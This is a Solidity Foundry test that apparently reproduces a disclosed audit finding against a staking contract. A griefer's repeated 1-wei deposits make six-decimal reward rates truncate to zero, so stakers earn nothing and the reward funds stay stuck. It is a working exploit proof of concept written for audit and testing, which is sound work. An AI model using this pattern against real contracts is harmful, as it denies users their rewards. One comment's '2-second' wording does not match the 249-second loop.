// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/symm/contracts/staking/SymmStaking.sol";

contract SymmMockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) allowance[from][msg.sender] = a - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

/// Reproduces Symmio Sherlock #575 against the real rewardPerToken arithmetic.
contract PoC_55104 is Test {
    SymmStaking internal staking;
    SymmMockToken internal symm;
    SymmMockToken internal usdc;
    address internal victim = address(0xA11CE);
    address internal griefer = address(0xB0B);

    function setUp() public {
        symm = new SymmMockToken("SYMM", "SYMM", 18);
        usdc = new SymmMockToken("USD Coin", "USDC", 6);
        staking = new SymmStaking();
        staking.initialize(address(this), address(symm));
        staking.configureRewardToken(address(usdc), true);

        symm.mint(victim, 1_000_000 ether);
        symm.mint(griefer, 1 ether);
        vm.prank(victim); symm.approve(address(staking), type(uint256).max);
        vm.prank(griefer); symm.approve(address(staking), type(uint256).max);
        vm.prank(victim); staking.deposit(1_000_000 ether, victim);

        usdc.mint(address(this), 1_209_600_000); // 1,209.6 USDC over one week
        usdc.approve(address(staking), type(uint256).max);
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(usdc);
        amounts[0] = 1_209_600_000;
        staking.notifyRewardAmount(tokens, amounts);
    }

    function testFrequentUpdatesRoundSixDecimalRewardsToZero() public {
        uint256 period = 7 days;
        // Every 2-second update writes lastUpdated even when the integer
        // division below returns zero: 2 * 2000 * 1e18 / 1e24 == 0.
        for (uint256 elapsed; elapsed < period;) {
            uint256 step = period - elapsed;
            if (step > 249) step = 249;
            vm.warp(block.timestamp + step);
            vm.prank(griefer);
            staking.deposit(1 wei, griefer);
            elapsed += step;
        }

        assertEq(staking.rewardPerToken(address(usdc)), 0);
        assertEq(staking.earned(victim, address(usdc)), 0);
        assertEq(staking.pendingRewards(address(usdc)), 1_209_600_000);

        vm.prank(victim);
        staking.claimRewards();
        assertEq(usdc.balanceOf(victim), 0);
        // The contract still holds the reward funds; they were never
        // distributed because the low-decimal rate was truncated on each
        // update.
        assertEq(usdc.balanceOf(address(staking)), 1_209_600_000);
    }
}
